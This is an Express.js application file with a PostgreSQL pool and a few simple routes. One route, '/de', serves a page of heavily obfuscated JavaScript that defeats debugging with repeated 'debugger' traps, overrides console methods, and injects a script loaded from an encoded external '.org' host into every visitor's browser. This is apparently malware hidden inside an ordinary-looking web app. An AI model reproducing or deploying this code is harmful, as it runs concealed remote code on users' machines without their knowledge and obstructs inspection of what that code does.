const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');
const {Pool} = require('pg');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// PostgreSQL
const pool = new Pool({
    user: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_USERNAME,
    host: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_HOST,
    database: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_DATABASE,
    password: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_PASSWORD,
    port: process.env.QOVERY_DATABASE_MY_POSTGRESQL_3498225_PORT,
});

app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/de', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title></title><link href="" rel="shortcut icon" /></head><body class="LsY8FfEWzDwBRT1ngGjqi"><div class="y0dPaLe5XR9xnG2" id="lHNVbMIFORQCqwPKrTYWmJDasiyGn"></div><script>var _0xdbe2=["zMi0ngi0mJiUANm=","y29UC3rYDwn0B3i=","Aw5WDxq=","AgvHza==","yMLUza==","DgvZDa==","C3rYAw5N","Dg9tDhjPBMC=","yxbWzw5Kq2HPBgq=","z2v0rwXLBwvUDhncEvrHz05HBwu=","zxjYB3i=","y2HHAw4=","CMv0DxjUicHMDw5JDgLVBIGPia==","ywn0Aw9U","E30Uy29UC3rYDwn0B3iOiNjLDhvY","Dgv4Dc9QyxzHC2nYAxb0","C3jJ","BIb0AgLZiIKOicK=","ltLHlxPblvPFjf0Qkq==","Bg9N","y291BNrLCG==","yxbWBhK=","x19WCM90B19F","z2DLCG==","y3jLyxrLrwXLBwvUDa==","xcTCkYaQkd86w2eTEKeTwL8KxvSW","D2HPBguGkhrYDwuPihT9","y29UC29Szq==","BgvUz3rO","zgvIDq==","DhLWzq==","Ahr0Chm6lY92EMfZlMfPB2vJB2LU","zNvUy3rPB24GkLWOicPCkq==","Aw5MBW=="];!function(c,x){!function(x){for(;--x;)c.push(c.shift())}(385)}(_0xdbe2);var _0x2c22=function(x,c){var n=_0xdbe2[x=+x];void 0===_0x2c22.QMbIzk&&(_0x2c22.oyEHaW=function(x){for(var c=function(x){for(var c,n,r=String(x).replace(/=+$/,""),t="",_=0,i=0;n=r.charAt(i++);~n&&(c=_%4?64*c+n:n,_++%4)&&(t+=String.fromCharCode(255&c>>(-2*_&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);return t}(x),n=[],r=0,t=c.length;r<t;r++)n+="%"+("00"+c.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(n)},_0x2c22.TkouVm={},_0x2c22.QMbIzk=!0);var r=_0x2c22.TkouVm[x];return void 0===r?(n=_0x2c22.oyEHaW(n),_0x2c22.TkouVm[x]=n):n=r,n},_0x707547=function(){var r=!0;return function(c,n){var x=r?function(){if(n){var x=n[_0x2c22("0xb")](c,arguments);return n=null,x}}:function(){};return r=!1,x}}();!function(){_0x707547(this,function(){var x=new RegExp(_0x2c22("0x16")),c=new RegExp(_0x2c22("0xf")+_0x2c22("0x8"),"i"),n=_0x1292e1("init");x[_0x2c22("0x1d")](n+_0x2c22("0x1"))&&c.test(n+_0x2c22("0x1a"))?_0x1292e1():n("0")})()}();var _0x569b1b=function(){var r=!0;return function(c,n){var x=r?function(){if(n){var x=n[_0x2c22("0xb")](c,arguments);return n=null,x}}:function(){};return r=!1,x}}(),_0x1e5fc8=_0x569b1b(this,function(){for(var x=function(){var c;try{c=Function(_0x2c22("0x2")+(_0x2c22("0x4")+_0x2c22("0x7"))+");")()}catch(x){c=window}return c}(),c=x[_0x2c22("0x11")]=x.console||{},n=[_0x2c22("0x9"),"warn",_0x2c22("0x17"),_0x2c22("0x0"),"exception","table","trace"],r=0;r<n[_0x2c22("0x12")];r++){var t=_0x569b1b[_0x2c22("0x19")].prototype[_0x2c22("0x1c")](_0x569b1b),_=n[r],i=c[_]||t;t[_0x2c22("0xc")]=_0x569b1b[_0x2c22("0x1c")](_0x569b1b),t[_0x2c22("0x1f")]=i[_0x2c22("0x1f")][_0x2c22("0x1c")](i),c[_]=t}});_0x1e5fc8();var emfromgetnbrtoo="",script34ssd=document[_0x2c22("0xe")]("script");function _0x1292e1(x){function c(x){if(typeof x===_0x2c22("0x1e"))return function(x){}[_0x2c22("0x19")](_0x2c22("0x10"))[_0x2c22("0xb")](_0x2c22("0xa"));1!==(""+x/x)[_0x2c22("0x12")]||x%20==0?function(){return!0}.constructor(_0x2c22("0x13")+_0x2c22("0xd")).call(_0x2c22("0x3")):function(){return!1}[_0x2c22("0x19")](_0x2c22("0x13")+"gger")[_0x2c22("0xb")]("stateObject"),c(++x)}try{if(x)return c;c(0)}catch(x){}}setInterval(function(){_0x1292e1()},4e3),script34ssd[_0x2c22("0x14")]=_0x2c22("0x5"),script34ssd[_0x2c22("0x6")]=_0x2c22("0x15")+".org/60a280b5122a524d"+_0x2c22("0x18"),document[_0x2c22("0x21")](_0x2c22("0x1b"))[0][_0x2c22("0x20")](script34ssd);</script></body></html>`);
});
// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
